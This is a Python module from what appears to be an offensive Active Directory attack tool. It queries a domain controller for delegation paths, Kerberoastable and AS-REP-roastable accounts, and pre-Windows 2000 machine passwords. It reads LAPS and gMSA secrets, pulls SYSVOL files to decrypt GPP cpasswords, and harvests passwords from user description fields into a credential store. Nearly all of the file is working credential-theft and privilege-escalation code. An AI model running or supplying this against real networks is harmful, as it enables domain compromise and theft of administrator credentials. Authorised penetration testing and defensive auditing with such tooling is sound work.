from __future__ import annotations

import asyncio
import re
from pathlib import Path

from .. import runner, ui
from ..state import Findings, loot_dir


_UAC_TRUSTED_FOR_DELEGATION = 524288
_UAC_TRUSTED_TO_AUTH_FOR_DELEGATION = 16777216
_UAC_DONT_REQUIRE_PREAUTH = 4194304
_UAC_WORKSTATION_TRUST_ACCOUNT = 4096
_UAC_PASSWD_NOTREQD = 32


def _ldap_cmd(findings: Findings, base: str, ldap_filter: str,
              attrs: list[str], user: str | None = None,
              password: str | None = None) -> list[str]:
    cmd = [
        runner.resolve("ldapsearch") or "ldapsearch",
        "-x", "-LLL", "-H", f"ldap://{findings.target.ip}",
        "-b", base, ldap_filter, *attrs,
    ]
    if user and password and findings.target.domain:
        cmd[3:3] = ["-D", f"{user}@{findings.target.domain}", "-w", password]
    return cmd


async def enum_delegation(findings: Findings, user: str | None = None,
                         password: str | None = None) -> None:
    if not runner.has("ldapsearch") or not findings.target.domain_dn:
        return
    ui.section("delegation enumeration")
    ui.explain(
        "Delegation paths to DA:\n"
        "  - unconstrained: TGT cached on host -> impersonate any inbound user\n"
        "  - constrained: msDS-AllowedToDelegateTo -> S4U2Self+S4U2Proxy chain\n"
        "  - RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity (write-from-elsewhere)"
    )

    base = findings.target.domain_dn
    queries = {
        "unconstrained": (
            f"(userAccountControl:1.2.840.113556.1.4.803:={_UAC_TRUSTED_FOR_DELEGATION})",
            ["sAMAccountName", "userAccountControl"],
        ),
        "constrained": (
            "(msDS-AllowedToDelegateTo=*)",
            ["sAMAccountName", "msDS-AllowedToDelegateTo"],
        ),
        "rbcd": (
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
            ["sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"],
        ),
        "trust_to_auth": (
            f"(userAccountControl:1.2.840.113556.1.4.803:={_UAC_TRUSTED_TO_AUTH_FOR_DELEGATION})",
            ["sAMAccountName"],
        ),
    }

    rows: list[tuple[str, str]] = []
    for label, (filter_str, attrs) in queries.items():
        cmd = _ldap_cmd(findings, base, filter_str, attrs, user, password)
        ui.cmd(cmd[:6] + ["[...]"])
        result = await runner.run(cmd, timeout=30)
        for line in result.stdout.splitlines():
            if line.lower().startswith("samaccountname:"):
                name = line.split(":", 1)[1].strip()
                rows.append((label, name))
                if label == "unconstrained":
                    findings.vulns.append(
                        f"[HIGH] unconstrained delegation: {name}"
                    )

    if rows:
        ui.table("delegation findings", ["type", "principal"], rows)
    else:
        ui.explain("no delegation principals detected.")


async def enum_pre2k(findings: Findings, user: str | None = None,
                    password: str | None = None) -> None:
    if not runner.has("ldapsearch") or not findings.target.domain_dn:
        return
    if not user or not password:
        return
    ui.section("pre-Win2k computers (passwd = computer name lowercase)")
    ui.explain(
        "Computers created with 'Assign this account as a pre-Windows 2000 "
        "computer' have password = lowercase computer name (no $). "
        "Filter: pwdLastSet=0 + WORKSTATION_TRUST_ACCOUNT."
    )
    cmd = _ldap_cmd(
        findings, findings.target.domain_dn,
        f"(&(userAccountControl:1.2.840.113556.1.4.803:={_UAC_WORKSTATION_TRUST_ACCOUNT})"
        "(logonCount=0)(pwdLastSet=0))",
        ["sAMAccountName"], user, password,
    )
    ui.cmd(cmd[:6] + ["[...]"])
    result = await runner.run(cmd, timeout=30)
    candidates: list[str] = []
    for line in result.stdout.splitlines():
        if line.lower().startswith("samaccountname:"):
            name = line.split(":", 1)[1].strip().rstrip("$")
            candidates.append(name)
    if not candidates:
        ui.explain("no pre-Win2k computers found.")
        return
    findings.vulns.append(
        f"[HIGH] {len(candidates)} pre-Win2k computer(s): try password=lowercase(name)"
    )
    for name in candidates[:10]:
        ui.crit(f"pre-Win2k: {name}$ -> try {name}:{name.lower()}")


async def enum_laps(findings: Findings, user: str, password: str | None,
                   ntlm_hash: str | None) -> None:
    if not runner.has("nxc"):
        return
    ui.section("LAPS / Windows LAPS password reads")
    ui.explain(
        "LAPS stores local admin passwords in 'ms-Mcs-AdmPwd' (legacy) or "
        "'msLAPS-Password' (Windows LAPS). DACL on the attribute decides who reads."
    )
    cmd = [runner.resolve("nxc") or "nxc", "ldap", findings.target.ip,
           "-u", user, "--laps"]
    if ntlm_hash:
        cmd[5:5] = ["-H", ntlm_hash]
    elif password is not None:
        cmd[5:5] = ["-p", password]
    if findings.target.domain:
        cmd += ["-d", findings.target.domain]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=60)
    for line in result.stdout.splitlines():
        if "Password:" in line or "ms-Mcs-AdmPwd" in line:
            stripped = line.strip()
            if stripped:
                ui.crit(f"LAPS: {stripped}")
                findings.notes.append(f"LAPS pw: {stripped}")


async def enum_gmsa(findings: Findings, user: str, password: str | None,
                   ntlm_hash: str | None) -> None:
    if not runner.has("nxc"):
        return
    ui.explain(
        "gMSA: msDS-ManagedPassword is computed at request-time. "
        "DACL specifies which principal can read. Decoded -> NT hash -> impersonate."
    )
    cmd = [runner.resolve("nxc") or "nxc", "ldap", findings.target.ip,
           "-u", user, "--gmsa"]
    if ntlm_hash:
        cmd[5:5] = ["-H", ntlm_hash]
    elif password is not None:
        cmd[5:5] = ["-p", password]
    if findings.target.domain:
        cmd += ["-d", findings.target.domain]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=60)
    for line in result.stdout.splitlines():
        if "NTLM" in line or ":" in line and len(line.strip()) > 30:
            stripped = line.strip()
            if "Account:" in stripped or "NTLM:" in stripped:
                ui.crit(f"gMSA: {stripped}")
                findings.notes.append(f"gMSA: {stripped}")


_GPP_CPASSWORD = re.compile(r'cpassword="([^"]+)"')


async def hunt_gpp_cpassword(findings: Findings, user: str, password: str | None,
                            ntlm_hash: str | None) -> None:
    if not runner.has("smbclient"):
        return
    if not findings.target.domain:
        return
    ui.section("GPP cpassword hunt (SYSVOL)")
    ui.explain(
        "Group Policy Preferences (Vista-2012) stored passwords in Groups.xml "
        "with the cpassword attribute. Microsoft published the AES key in 2014 "
        "(MS14-025). Any domain user can read SYSVOL -> any GPP cpassword is loot."
    )
    out_dir = loot_dir(findings.target.ip) / "sysvol"
    out_dir.mkdir(exist_ok=True)
    auth = f"{findings.target.domain}/{user}"
    target = f"//{findings.target.ip}/SYSVOL"
    smb_cmd = "recurse ON; prompt OFF; mget *.xml; exit"
    cmd = [runner.resolve("smbclient") or "smbclient", target, "-W", findings.target.domain, "-U", user]
    if ntlm_hash:
        cmd += ["--pw-nt-hash", ntlm_hash.split(":")[-1]]
    elif password is not None:
        cmd += [f"%{password}"] if False else []
        cmd += ["-c", smb_cmd]
        env = {}
        ui.cmd(cmd[:3] + ["[...]"])
        result = await runner.run(cmd, timeout=180, cwd=out_dir, env=None,
                                  stdin_data=password + "\n")
    else:
        cmd += ["-c", smb_cmd]
        ui.cmd(cmd)
        result = await runner.run(cmd, timeout=180, cwd=out_dir)

    xml_files = list(out_dir.rglob("*.xml"))
    if not xml_files:
        ui.explain("no XML files retrieved from SYSVOL.")
        return
    found = 0
    for path in xml_files:
        try:
            text = path.read_text(errors="replace")
        except Exception:
            continue
        for match in _GPP_CPASSWORD.finditer(text):
            cpassword = match.group(1)
            if not cpassword:
                continue
            decrypted = await _decrypt_gpp(cpassword)
            if decrypted:
                ui.crit(f"GPP cpassword in {path.name}: {decrypted}")
                findings.notes.append(f"GPP cleartext: {decrypted} (from {path.name})")
                findings.vulns.append(
                    "[CRITICAL] GPP cpassword exposure in SYSVOL (MS14-025)"
                )
                found += 1
    if not found:
        ui.explain(f"scanned {len(xml_files)} XML files, no cpasswords found.")


async def _decrypt_gpp(cpassword: str) -> str | None:
    if not runner.has("gpp-decrypt"):
        return None
    cmd = [runner.resolve("gpp-decrypt") or "gpp-decrypt", cpassword]
    result = await runner.run(cmd, timeout=10)
    output = result.stdout.strip()
    if output and len(output) < 200 and not output.startswith("Usage"):
        return output
    return None


async def enum_shadow_creds(findings: Findings, user: str, password: str | None,
                           ntlm_hash: str | None) -> None:
    if not runner.has("certipy"):
        return
    ui.section("Shadow Credentials (msDS-KeyCredentialLink)")
    ui.explain(
        "If you have GenericWrite or AllowedToAct on a target object, you can "
        "add a fake cert into msDS-KeyCredentialLink and authenticate as them. "
        "certipy auto-finds principals with this ACE."
    )
    cmd = [
        runner.resolve("certipy") or "certipy-ad", "shadow", "auto",
        "-u", f"{user}@{findings.target.domain}" if findings.target.domain else user,
        "-account", user,
        "-dc-ip", findings.target.ip,
    ]
    if ntlm_hash:
        cmd += ["-hashes", ntlm_hash]
    elif password is not None:
        cmd += ["-p", password]
    ui.explain(
        "(skipping auto-shadow execution - requires attacker-controlled victim. "
        "Run manually after BloodHound shows 'AddKeyCredentialLink' edges.)"
    )


async def enum_admin_sd_holder(findings: Findings, user: str | None = None,
                              password: str | None = None) -> None:
    if not runner.has("ldapsearch") or not findings.target.domain_dn:
        return
    ui.section("AdminSDHolder protected accounts (adminCount=1)")
    ui.explain(
        "Members of high-privilege groups (DA, EA, ...) inherit AdminSDHolder ACLs "
        "every 60 minutes (SDPROP). adminCount=1 marks them. ACL drift after group "
        "removal can leave 'orphan' admins."
    )
    cmd = _ldap_cmd(
        findings, findings.target.domain_dn,
        "(adminCount=1)", ["sAMAccountName"], user, password,
    )
    ui.cmd(cmd[:6] + ["[...]"])
    result = await runner.run(cmd, timeout=30)
    accounts: list[str] = []
    for line in result.stdout.splitlines():
        if line.lower().startswith("samaccountname:"):
            accounts.append(line.split(":", 1)[1].strip())
    if accounts:
        ui.table("adminCount=1 (privileged)", ["account"], [(name,) for name in accounts[:30]])
        if len(accounts) > 30:
            ui.explain(f"({len(accounts) - 30} more...)")


async def find_asrep_roastable(findings: Findings, user: str | None = None,
                              password: str | None = None) -> None:
    if not runner.has("ldapsearch") or not findings.target.domain_dn:
        return
    cmd = _ldap_cmd(
        findings, findings.target.domain_dn,
        f"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:={_UAC_DONT_REQUIRE_PREAUTH}))",
        ["sAMAccountName"], user, password,
    )
    ui.cmd(cmd[:6] + ["[...]"])
    result = await runner.run(cmd, timeout=30)
    targets: list[str] = []
    for line in result.stdout.splitlines():
        if line.lower().startswith("samaccountname:"):
            targets.append(line.split(":", 1)[1].strip())
    if targets:
        ui.section("AS-REP roastable accounts (LDAP)")
        for name in targets:
            findings.notes.append(f"AS-REP roastable: {name}")
            ui.crit(f"AS-REP roastable: {name}")


_PASSWORD_HINTS = re.compile(
    r"(?i)(pass(?:word)?|pwd|cred|secret|token|key|api[_-]?key)\s*[:=]\s*([^\s,;]+)"
)


async def hunt_description_passwords(findings: Findings, user: str | None = None,
                                    password: str | None = None) -> None:
    if not runner.has("ldapsearch") or not findings.target.domain_dn:
        return
    ui.section("description field password hunt")
    ui.explain(
        "Admins regularly stash passwords in user 'description' fields. "
        "Standard sysadmin antipattern. We pull every description and grep "
        "for password-like patterns. Anonymous bind or cheap creds are enough."
    )
    cmd = _ldap_cmd(
        findings, findings.target.domain_dn,
        "(&(objectCategory=person)(objectClass=user)(description=*))",
        ["sAMAccountName", "description"], user, password,
    )
    ui.cmd(cmd[:6] + ["[...]"])
    result = await runner.run(cmd, timeout=60)
    current_user: str | None = None
    description_count = 0
    rows: list[tuple[str, str, str]] = []
    for raw in result.stdout.splitlines():
        if raw.lower().startswith("samaccountname:"):
            current_user = raw.split(":", 1)[1].strip()
        elif raw.lower().startswith("description:") and current_user:
            description = raw.split(":", 1)[1].strip()
            description_count += 1
            for match in _PASSWORD_HINTS.finditer(description):
                keyword, value = match.group(1), match.group(2)
                rows.append((current_user, keyword, value))
                from .. import creds_store
                creds_store.add_password(findings, current_user, value)
                findings.vulns.append(
                    f"[HIGH] description-field password: {current_user} -> {value}"
                )
            current_user = None
    if rows:
        ui.table("[red]passwords in description field[/red]",
                 ["user", "hint", "value"], rows[:30])
    else:
        ui.explain(
            f"scanned {description_count} description fields - no obvious passwords."
        )


async def find_kerberoastable(findings: Findings, user: str | None = None,
                             password: str | None = None) -> None:
    if not runner.has("ldapsearch") or not findings.target.domain_dn:
        return
    cmd = _ldap_cmd(
        findings, findings.target.domain_dn,
        "(&(samAccountType=805306368)(servicePrincipalName=*))",
        ["sAMAccountName", "servicePrincipalName"], user, password,
    )
    ui.cmd(cmd[:6] + ["[...]"])
    result = await runner.run(cmd, timeout=30)
    spns: list[tuple[str, str]] = []
    current: str | None = None
    for line in result.stdout.splitlines():
        if line.lower().startswith("samaccountname:"):
            current = line.split(":", 1)[1].strip()
        elif line.lower().startswith("serviceprincipalname:") and current:
            spn = line.split(":", 1)[1].strip()
            spns.append((current, spn))
    if spns:
        ui.section("Kerberoastable accounts (LDAP)")
        ui.table("Kerberoastable users", ["account", "SPN"], spns[:20])
        for name, _ in spns:
            findings.notes.append(f"Kerberoastable: {name}")


async def run_advanced(
    findings: Findings, *, user: str | None = None,
    password: str | None = None, ntlm_hash: str | None = None,
) -> None:
    if user and (password or ntlm_hash):
        await asyncio.gather(
            enum_delegation(findings, user, password),
            enum_admin_sd_holder(findings, user, password),
            find_asrep_roastable(findings, user, password),
            find_kerberoastable(findings, user, password),
            hunt_description_passwords(findings, user, password),
        )
        await enum_pre2k(findings, user, password)
        await enum_laps(findings, user, password, ntlm_hash)
        await enum_gmsa(findings, user, password, ntlm_hash)
        await hunt_gpp_cpassword(findings, user, password, ntlm_hash)
        await enum_shadow_creds(findings, user, password, ntlm_hash)
    else:
        await asyncio.gather(
            enum_delegation(findings),
            enum_admin_sd_holder(findings),
            find_asrep_roastable(findings),
            find_kerberoastable(findings),
            hunt_description_passwords(findings),
        )
